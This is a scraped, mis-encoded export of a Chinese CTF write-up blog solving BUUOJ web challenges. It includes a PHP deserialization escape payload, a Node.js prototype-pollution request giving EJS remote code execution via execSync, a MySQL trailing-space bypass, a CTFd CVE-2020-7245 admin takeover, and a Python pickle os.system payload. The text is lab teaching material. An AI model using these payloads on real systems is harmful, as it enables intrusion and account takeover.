returnçš„æ—¶å€™è¿˜æœ‰ä¸ªsafeå‡½æ•°å‘¢ã€‚å‰é¢è¯´è¿‡ï¼Œsafeå‡½æ•°åªæ˜¯ç®€å•åœ°æ›¿æ¢äº†å­—ç¬¦ï¼ŒæŠŠç›¸åº”å­—ç¬¦ä¸²æ›¿æ¢æˆhackerï¼Œé‚£ä¹ˆåŸæ¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²å°±æœ‰ç›¸å½“å¤§çš„å‡ ç‡è¢«ç ´åæ‰ï¼ŒPHPåºåˆ—åŒ–æ—¶è®¡ç®—çš„å­—ç¬¦ä¸²é•¿åº¦ä¸å®é™…å­—ç¬¦ä¸²é•¿åº¦ä¸å¯¹åº”ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€ƒé€¸å‡ºæ¥æ’å…¥æˆ‘ä»¬æƒ³è¦çš„å†…å®¹äº†ã€‚ä¹‹å‰ä¹Ÿæœ‰ä¸€é“é¢˜AXB 2019 Easy serialize phpè€ƒè¿™ä¸ªã€‚æ€è·¯å°±æ˜¯åˆ©ç”¨safe()å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦å˜æˆ6ä¸ªå­—ç¬¦ï¼ŒæŠŠæ‰€æœ‰çš„PayloadåŒ…å«è¿›å»ã€‚ æœ€ç»ˆPayloadå¦‚ä¸‹ï¼š 12345678910111213141516POST /update.php HTTP/1.1Host: bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cn/Connection: closeCookie: _ga=GA1.2.744187123.1582874453; PHPSESSID=2bc6e7caef6bc5c3495fe91dcf0eb6c2Upgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-Type: application/x-www-form-urlencodedContent-Length: 603age=1&amp;nickname=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:5:&quot;23333&quot;;s:8:&quot;nickname&quot;;s:8:&quot;Tiaonmmn&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125; æäº¤å°±ä¼šè¿”å›adminçš„MD5ï¼Œæ³¨æ„æœ€åé¢åŠ ä¸Šäº†ä¸€ä¸ªâ€œ0-0â€ã€‚ è§£å¯†å°±å¯ä»¥ç™»å½•ï¼Œæ‹¿åˆ°flagäº†ã€‚ flag{d73e9619-0858-4478-a940-b89dbb80d7ad}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Ez_express","slug":"BUUOJåˆ·é¢˜-Web-Ez-express","date":"2020-03-02T03:10:57.000Z","updated":"2020-03-02T08:55:11.823Z","comments":true,"path":"2020/03/02/BUUOJåˆ·é¢˜-Web-Ez-express/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/","excerpt":"","text":"2020 iæ˜¥ç§‹æ–°æ˜¥å…¬ç›Šèµ›çš„Ez_expressï¼ŒNodeJSçš„é¢˜ã€‚ å¼€é¢˜æç¤ºæˆ‘ä»¬ç”¨ADMINç™»å½•ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸‹é¡µé¢æ³¨é‡Šæç¤ºwww.zipã€‚çœ‹ä¸€ä¸‹app.jsï¼ŒExpressæ¡†æ¶çš„ç¨‹åºï¼Œindexé¡µé¢æŒ‡å‘routes/index.jsã€‚ loginè·¯ç”±æœ‰ç‚¹ä¸œè¥¿ï¼š 12345678910111213141516171819202122232425router.post(&#x27;/login&#x27;, function (req, res) &#123; if (req.body.Submit == &quot;register&quot;) &#123; if (safeKeyword(req.body.userid)) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user = &#123; &#x27;user&#x27;: req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;: false &#125; res.redirect(&#x27;/&#x27;); &#125; else if (req.body.Submit == &quot;login&quot;) &#123; if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123; req.session.user.isLogin = true; &#125; else &#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;); safeKeyword()ä½¿å¾—æˆ‘ä»¬æ³¨å†Œçš„æ—¶å€™ä¸èƒ½ç”¨\"admin\"ï¼Œè€Œé¢˜ç›®åˆè¦æ±‚æˆ‘ä»¬ç”¨adminç”¨æˆ·åç™»å½•ã€‚æ³¨æ„åˆ°åœ¨register()é‡Œç”¨æˆ·åç‰¹åˆ«çš„åŠ äº†ä¸€æ­¥toUppercase()æ“ä½œï¼Œè¿™æ˜¯å¹²ä»€ä¹ˆç”¨çš„ï¼Ÿ å‚è€ƒè¿™é‡Œï¼ŒJavascriptåœ¨å¤„ç†æŸäº›è¯­ç³»ç‰¹å®šå­—ç¬¦çš„æ—¶å€™ä¼šæœ‰äº›æ„å¤–ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Ä±æ¥ä»£æ›¿iï¼Œé™¤äº†ä¸Šæ–‡æåˆ°çš„å‡ ä¸ªï¼Œè¿™é‡Œè¿˜æœ‰è¡¥å……ã€‚ å› æ­¤æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªadmÄ±nç”¨æˆ·å³å¯ç»•è¿‡é™åˆ¶äº†ã€‚ç„¶åå°±è®©æˆ‘ä»¬æäº¤ä½ æœ€å–œæ¬¢çš„è¯­è¨€ï¼Ÿï¼Ÿï¼Ÿ 1234567router.post(&#x27;/action&#x27;, function (req, res) &#123; if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;); æˆ‘ä»¬POSTè¿‡å»çš„ä¸œè¥¿è¢«clone()åˆ°äº†req.bodyå¯¹è±¡é‡Œã€‚ 1234567891011121314const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;; è¿™å°±æ¶‰åŠåˆ°æ–°çš„çŸ¥è¯†ç‚¹äº†ï¼ŒåŸå‹é“¾æ±¡æŸ“ã€‚å…·ä½“å‚è€ƒè¿™é‡Œã€è¿™é‡Œå’Œè¿™é‡Œã€‚ç®€å•æ¥è¯´ï¼ŒJavaScripté‡Œç»å¤§éƒ¨åˆ†å¯¹è±¡ç»§æ‰¿äº†Objectå¯¹è±¡ï¼Œä¾‹å¦‚Stringå¯¹è±¡å°±ç»§æ‰¿äºStringç±»ï¼ˆfunctionç­‰åŒäºclassï¼‰ï¼Œåˆç»§æ‰¿äºObjectå¯¹è±¡ã€‚é‚£ä¹ˆStringå¯¹è±¡çš„åŸå‹å°±æ˜¯Stringç±»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š graph LR A[&quot;Object()&quot;]--&gt;|Prototype|B[&quot;function String()&quot;] B--&gt;|Prototype|C[&quot;123&quot;] è¿™æ¡ç»§æ‰¿é“¾å°±å«åšåŸå‹é“¾ã€‚æˆ‘ä»¬å¦‚æœåœ¨function String()é‡Œæ·»åŠ æ–¹æ³•æˆ–å±æ€§ï¼Œç»§æ‰¿å®ƒçš„'123'ä¼šæ·»åŠ ç›¸åŒçš„æ–¹æ³•å±æ€§ã€‚è€ŒJavaScriptåœ¨è®¿é—®æŸå¯¹è±¡å±æ€§æˆ–æ–¹æ³•æ—¶æ˜¯ä»åŸå‹é“¾èµ·å§‹Object()å¼€å§‹æŸ¥æ‰¾ï¼Œç›´åˆ°æœ€åçš„ç›®æ ‡ã€‚å› æ­¤å‡è®¾æˆ‘ä»¬ä¸ºObject()æ·»åŠ äº†ä¸ªtoUppercase()æ–¹æ³•ï¼Œæœ€å'123'.toUppercase()å°±ä¼šä¼˜å…ˆè°ƒç”¨Object()çš„toUppercase()ï¼Œè¿™æ ·toUppercase()å°±è¢«æˆ‘ä»¬æ±¡æŸ“äº†ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•å°±å«åŸå‹é“¾æ±¡æŸ“ã€‚æ³¨æ„ä¸€ç‚¹ï¼ŒåŸå‹é“¾æ±¡æŸ“çš„æ—¶å€™æˆ‘ä»¬éœ€è¦ä¼ å…¥JSONæ•°æ®ï¼Œå³å‘åŒ…çš„Content-typeè¦å˜æˆapplication/jsonï¼Œå¦åˆ™__proto__ä¸ä¼šè¦†ç›–ã€‚ å›åˆ°é¢˜ç›®ï¼Œä¸‹é¢çš„é—®é¢˜æ˜¯æˆ‘ä»¬çš„è¾“å…¥æ€æ ·æ±¡æŸ“å‘¢ï¼Ÿæ³¨æ„åˆ°åœ¨route('/')çš„æ—¶å€™æœ‰ç‚¹ä¸œè¥¿ï¼š 1234567router.get(&#x27;/&#x27;, function (req, res) &#123; if (!req.session.user) &#123; res.redirect(&#x27;/login&#x27;); &#125; res.outputFunctionName = undefined; res.render(&#x27;index&#x27;, data = &#123;&#x27;user&#x27;: req.session.user.user&#125;);&#125;); ä¸ºä»€ä¹ˆå¤šå‡ºæ¥ä¸ªoutputFunctionNameï¼Ÿæœ¬é¢˜çš„æ¸²æŸ“å¼•æ“ç”¨çš„ejsï¼Œè²Œä¼¼åœ¨åˆšæ‰çš„å‚è€ƒæ–‡ç« é‡Œæåˆ°å¯ä»¥é€ æˆRCEã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬æŠ„ä¸€ä¸‹RCEçš„Payloada; return global.process.mainModule.constructor._load('child_process').execSync('whoami');ã€‚å‘åŒ…å§ï¼š 123456789101112131415POST /action HTTP/1.1Host: 56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 146Origin: http://56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cnConnection: closeReferer: http://54830c3c-4435-4ff0-814f-a9cfc97ec6d0.node3.buuoj.cn/Cookie: _ga=GA1.2.744187123.1582874453; session=s%3AuujbI4q6GPRCu7MQpsxrcvFqt0tTzzAV.jGfKfFz5gfEczv2Yw1LCl1nHqwMEsY2k6Zup91j0X88Upgrade-Insecure-Requests: 1&#123;&quot;lua&quot;:&quot;aaa&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;); //&quot;&#125;&#125; æäº¤ååˆ·æ–°é¡µé¢å³å¯å¾—åˆ°flagã€‚ flag{3fa89b5f-528d-434b-9ada-e93a864b2969}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"},{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","permalink":"http://tiaonmmn.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Products Manager","slug":"BUUOJåˆ·é¢˜-Web-Products-Manager","date":"2020-03-01T12:14:48.000Z","updated":"2020-03-01T13:44:08.950Z","comments":true,"path":"2020/03/01/BUUOJåˆ·é¢˜-Web-Products-Manager/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/01/BUUOJ%E5%88%B7%E9%A2%98-Web-Products-Manager/","excerpt":"","text":"FaceBook CTF 2019çš„Products Managerã€‚ç»™äº†æºç ï¼ŒçŒœæµ‹æ˜¯SQLæ³¨å…¥çš„é¢˜ã€‚ å¼€é¢˜å…è®¸æˆ‘ä»¬æŸ¥çœ‹Top 5çš„Productsï¼Œæ·»åŠ è‡ªå·±çš„å•†å“ï¼Œæˆ–è€…æŸ¥çœ‹å…¶ä»–äººçš„å•†å“è¯¦æƒ…ï¼Œä½†æ˜¯éœ€è¦è¾“å…¥å¯†ç ã€‚é‚£ä¹ˆç›²çŒœflagåœ¨æŸä¸ªå•†å“è¯¦æƒ…é‡Œé¢ã€‚ çœ‹ä¸€ä¸‹æºç ï¼Œdb.phpå‘Šè¯‰æˆ‘ä»¬flagåœ¨facebookå•†å“é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°å®ƒçš„å¯†ç ã€‚db.phpåŒ…å«æ•°æ®åŒºè¯»å†™æ“ä½œï¼Œæ‰€æœ‰çš„SQLè¯­å¥éƒ½ä½¿ç”¨äº†prepareï¼Œçœ‹æ¥SQLæ³¨å…¥åºŸäº†ã€‚æˆ‘ä»¬é‡ç‚¹çœ‹ä¸€ä¸‹view.phpã€‚ 123456789101112131415161718192021function handle_post() &#123; global $_POST; $name = $_POST[&quot;name&quot;]; $secret = $_POST[&quot;secret&quot;]; if (isset($name) &amp;&amp; $name !== &quot;&quot; &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) &#123; if (check_name_secret($name, hash(&#x27;sha256&#x27;, $secret)) === false) &#123; return &quot;Incorrect name or secret, please try again&quot;; &#125; $product = get_product($name); echo &quot;&lt;p&gt;Product details:&quot;; echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&#x27;name&#x27;]) . &quot;&lt;/li&gt;&quot;; echo &quot;&lt;li&gt;&quot; . htmlentities($product[&#x27;description&#x27;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;; &#125; return null;&#125; è¿‡äº†check_name_secret()åä¼šè°ƒç”¨get_product()è·å¾—å•†å“ä¿¡æ¯ã€‚é—®é¢˜æ¥äº†ï¼Œget_product()é‡Œçš„SQLè¯­å¥æ˜¯è¿™ä¹ˆå†™çš„SELECT name, description FROM products WHERE name = ?ï¼Œè€Œnameåœ¨MySQLä¸­æ˜¯char(64)ç±»å‹ï¼Œå¯¹MySQLè€Œè¨€ï¼Œcharå’Œvarcharç±»å‹æœ‰ä¸ªå¥‡æ€ªçš„ç‰¹æ€§ã€‚ All MySQL collations are of type PAD SPACE. This means that all CHAR, VARCHAR, and TEXT values are compared without regard to any trailing spaces. â€œComparisonâ€ in this context does not include the LIKE pattern-matching operator, for which trailing spaces are significant. https://dev.mysql.com/doc/refman/5.7/en/char.html ä½¿ç”¨=æ¯”è¾ƒçš„æ—¶å€™MySQLä¼šå¿½ç•¥æ‰å­—ç¬¦ä¸²åé¢çš„ç©ºæ ¼ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä¼ å…¥'facebook 'ï¼ŒSQLè¯­å¥å˜æˆselect name,description from products where name='facebook ';å¯¹MySQLè€Œè¨€ï¼Œç­‰åŒäºselect name,description from products where name='facebook';ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨add.phpçš„handle_post()é‡Œä¼ å…¥'facebook 'ï¼Œä¼šå…ˆè¿›è¡Œget_product()ï¼Œè€Œget_product()é”™è¯¯çš„è¿”å›äº†'facebook'çš„æ•°æ®ï¼Œå› æ­¤å¯ä»¥é€šè¿‡é‡åçš„æ£€æŸ¥ä»è€Œæ’å…¥äº†ä¸€æ¡'facebook 'çš„æ•°æ®ã€‚å½“æˆ‘ä»¬viewçš„æ—¶å€™ï¼Œä¼šè¿‡check_name_secret()ï¼Œä»ç„¶ä½¿ç”¨=æ¯”è¾ƒï¼šSELECT name FROM products WHERE name = ? AND secret = ?ï¼ŒMySQLè®¤ä¸º'facebook'ä¸'facebook 'æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤secretä¸ºæˆ‘ä»¬è®¾ç½®çš„å€¼æ—¶selectæ­£å¸¸è¿”å›ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡facebookçš„secretäº†ã€‚ä½†æ˜¯get_product()çš„æ—¶å€™åªä¼šè¿”å›'facebook'çš„ç»“æœï¼Œä¸ä¼šè¿”å›'facebook 'çš„ç»“æœã€‚ æ‰€ä»¥ï¼ŒAddä¸€ä¸ª'facebook 'çš„Productï¼Œsecretä»»æ„è®¾ç½®ã€‚ç„¶åviewï¼Œåç§°å¡«'facebook'ï¼Œsecretä¸ºåˆšæ‰è®¾ç½®çš„å€¼ï¼Œå³å¯æ‹¿åˆ°flagã€‚ flag{246d6062-dca6-4de4-adbb-5f5a3770b9e6}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"BUUOJåˆ·é¢˜-Web-HappyCTFd","slug":"BUUOJåˆ·é¢˜-Web-HappyCTFd","date":"2020-03-01T02:43:44.000Z","updated":"2020-03-01T12:56:44.985Z","comments":true,"path":"2020/03/01/BUUOJåˆ·é¢˜-Web-HappyCTFd/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/01/BUUOJ%E5%88%B7%E9%A2%98-Web-HappyCTFd/","excerpt":"","text":"BUUOJä¸ŠV&amp;Nçš„æ‹›æ–°é¢˜ï¼Œæ¶‰åŠåˆ°CTFdçš„ä¸€ä¸ªæ´CVE-2020-7245ã€‚ å¼€é¢˜å‘ç°å°±æ˜¯ä¸ªCTFdçš„é¡µé¢ï¼Œéšä¾¿æ³¨å†Œåå‘ç°å•¥éƒ½æ²¡æœ‰ï¼Œåªæœ‰ä¸ªadminç”¨æˆ·ï¼Œçœ‹æ¥æˆ‘ä»¬éœ€è¦å¾—åˆ°adminçš„æƒé™ã€‚ ä¹‹å‰çœ‹CTFdçš„Release Notesæ—¶æ³¨æ„åˆ°åœ¨2.2.3ç‰ˆæœ¬æœ‰ä¸ªsecurity fixï¼Œä¿®äº†ä¸ªä»»æ„ç”¨æˆ·æ¥ç®¡çš„æ´ã€‚é‚£å°±çœ‹ä¸€ä¸‹2.2.3å’Œ2.2.2ç‰ˆæœ¬çš„diffï¼Œåˆ°åº•æ”¹äº†ä»€ä¹ˆã€‚ æ ¸å¿ƒå†…å®¹æ˜¯auth.pyï¼Œçœ‹ä¸€ä¸‹register()å‡½æ•° 2.2.21234567891011121314def register(): errors = get_errors() if request.method == &quot;POST&quot;: name = request.form[&quot;name&quot;] email_address = request.form[&quot;email&quot;] password = request.form[&quot;password&quot;] name_len = len(name) == 0 names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first() emails = ( Users.query.add_columns(&quot;email&quot;, &quot;id&quot;) .filter_by(email=email_address) .first() ) 2.2.2ç‰ˆæœ¬ä¸‹éªŒè¯æ˜¯å¦å·²å­˜åœ¨ç”¨æˆ·æ—¶é€šè¿‡request.formç›´æ¥å–å€¼ï¼Œä½†æ˜¯åœ¨åé¢åˆæ¥äº†æ®µ 2.2.212345678910else: with app.app_context(): user = Users( name=name.strip(), email=email_address.lower(), password=password.strip(), ) db.session.add(user) db.session.commit() db.session.flush() å†™å…¥æ•°æ®åº“çš„æ—¶å€™nameç»è¿‡äº†strip()ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ³¨å†Œçš„æ—¶å€™å†™adminå°±ä¼šé€ æˆå®é™…å†™å…¥åº“çš„ç”¨æˆ·åæ˜¯adminã€‚å†å›å¤´çœ‹reset_password() 2.2.21234567891011if request.method == &quot;POST&quot;: user = Users.query.filter_by(name=name).first_or_404() user.password = request.form[&quot;password&quot;].strip() db.session.commit() log( &quot;logins&quot;, format=&quot;[&#123;date&#125;] &#123;ip&#125; - successful password reset for &#123;name&#125;&quot;, name=name, ) db.session.close() return redirect(url_for(&quot;auth.login&quot;)) æŸ¥è¯¢ç”¨æˆ·çš„æ—¶å€™ç›´æ¥ä½¿ç”¨åº“é‡Œçš„nameå­—æ®µï¼Œå½“æˆ‘ä»¬æ³¨å†Œadmin ï¼ˆnä¸ªç©ºæ ¼ï¼‰çš„æ—¶å€™é‡ç½®å¯†ç ï¼Œå®é™…ä¸Šé‡ç½®çš„æ˜¯adminç”¨æˆ·çš„å¯†ç ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä»»æ„ç™»å½•adminç”¨æˆ·äº†ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œæ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š æ³¨å†Œç”¨æˆ·ä¸ºadmin ï¼ˆåé¢åŠ ä¸Šç©ºæ ¼ï¼‰ é‡ç½®å¯†ç  åœ¨2.2.3ç‰ˆæœ¬ä¸‹ï¼Œregister()å‡½æ•°ä¼šé¦–å…ˆè¿›è¡Œnameçš„strip() 2.2.31234567891011121314def register(): errors = get_errors() if request.method == &quot;POST&quot;: name = request.form.get(&quot;name&quot;, &quot;&quot;).strip() email_address = request.form.get(&quot;email&quot;, &quot;&quot;).strip().lower() password = request.form.get(&quot;password&quot;, &quot;&quot;).strip() name_len = len(name) == 0 names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first() emails = ( Users.query.add_columns(&quot;email&quot;, &quot;id&quot;) .filter_by(email=email_address) .first() ) æˆ‘ä»¬æ²¡åŠæ³•åˆ¶é€ å‡ºé‡åçš„ç”¨æˆ·ï¼Œå°±æ²¡åŠæ³•åˆ©ç”¨äº†ã€‚ å›åˆ°é¢˜ç›®ï¼ŒBUUOJé‡Œç»™äº†é‚®ä»¶æœåŠ¡å™¨mail.buuoj.cnï¼Œæ³¨å†Œçš„æ—¶å€™å¡«ç»™çš„é‚®ç®±å°±è¡Œã€‚ç™»å½•æˆadminåä¼šå‘ç°æœ‰ä¸€é“Hiddençš„é¢˜ï¼Œä¸‹è½½é™„ä»¶å°±èƒ½çœ‹åˆ°flagäº†ã€‚ flag{d993d0f0-b9b7-4cb3-9a58-e5f1b1304c1c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"CTFd","slug":"CTFd","permalink":"http://tiaonmmn.github.io/tags/CTFd/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Pickle-Store","slug":"BUUOJåˆ·é¢˜-Web-Pickle-Store","date":"2020-02-28T06:52:57.000Z","updated":"2020-03-01T11:55:32.602Z","comments":true,"path":"2020/02/28/BUUOJåˆ·é¢˜-Web-Pickle-Store/","link":"","permalink":"http://tiaonmmn.github.io/2020/02/28/BUUOJ%E5%88%B7%E9%A2%98-Web-Pickle-Store/","excerpt":"watevCTF 2019çš„Pickle Storeã€‚ï¼ˆæ³¨ï¼Œpickleæœ‰é…¸é»„ç“œçš„æ„æ€ï¼‰ å¼€é¢˜åæ˜¯ä¸ªè´­ä¹°ç½‘ç«™ï¼ŒBurpæŠ“ä¸€ä¸‹åŒ…ï¼Œåœ¨Cookieä¸­æœ‰äº›ä¸œè¥¿ã€‚","text":"watevCTF 2019çš„Pickle Storeã€‚ï¼ˆæ³¨ï¼Œpickleæœ‰é…¸é»„ç“œçš„æ„æ€ï¼‰ å¼€é¢˜åæ˜¯ä¸ªè´­ä¹°ç½‘ç«™ï¼ŒBurpæŠ“ä¸€ä¸‹åŒ…ï¼Œåœ¨Cookieä¸­æœ‰äº›ä¸œè¥¿ã€‚ Coookiesé‡Œç»™äº†ä¸²åƒæ˜¯Base64çš„ä¸œè¥¿ï¼Œè§£å‡ºæ¥å‘ç°æ˜¯ä¸€äº›ä¹±ç b'\\x80\\x03&#125;q\\x00(X\\x05\\x00\\x00\\x00moneyq\\x01M\\xf4\\x01X\\x07\\x00\\x00\\x00historyq\\x02]q\\x03X\\x10\\x00\\x00\\x00anti_tamper_hmacq\\x04X \\x00\\x00\\x00aa1ba4de55048cf20e0a7a63b7f8eb62q\\x05u.'ã€‚æœ‰æ˜æ–‡å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼šæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼ŸæŠ¬å¤´çœ‹çœ‹æ ‡é¢˜ï¼ŒPickle Storeï¼Œä¼šä¸ä¼šæ˜¯Python pickleæ•°æ®ï¼Ÿpickle.loadsè§£ä¸€ä¸‹æœç„¶å‡ºä¸œè¥¿äº†&#123;'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'&#125;ã€‚ å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬æŠŠmoneyæ”¹äº†å°±å¯ä»¥ä»»æ„è´­ä¹°ä¸œè¥¿ï¼Œä½†æ˜¯æœ€åé‚£ä¸ªæ‰çœ¼çš„anti_tamper_hmacæ˜¯ä»€ä¹ˆé¬¼ã€‚å¼ºè¡Œä¿®æ”¹moneyåpickle.dumpsï¼Œå†Base64å›å»ï¼Œæ¢æ‰Cookiesï¼Œæœç„¶moneyæ²¡å˜åŒ–ã€‚ ä¸‹é¢ç ”ç©¶ä¸€ä¸‹HMACï¼Œä¸è¿‡åœ¨ç ”ç©¶HMACä¹‹å‰ï¼Œæˆ‘ä»¬è¦æƒ³åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œä»–ç«Ÿç„¶æ•¢ç”¨Pickleï¼ŸPickleå¾ˆå®¹æ˜“RCEçš„ï¼Œä¾‹å¦‚è¿™é‡Œã€‚ç…§ç€å†™ä¸ªclasså¥½äº† 1234567import pickleimport osimport base64class evil(object): def __reduce__(self): return (os.system,(&#x27;ls&#x27;,))print(base64.b64encode(pickle.dumps(evil()))) æŠŠCookiesæ›¿æ¢äº†ï¼Œå‘ç°500äº†ã€‚æˆ‘ä»¬æŠŠlsæ¢æˆsleep 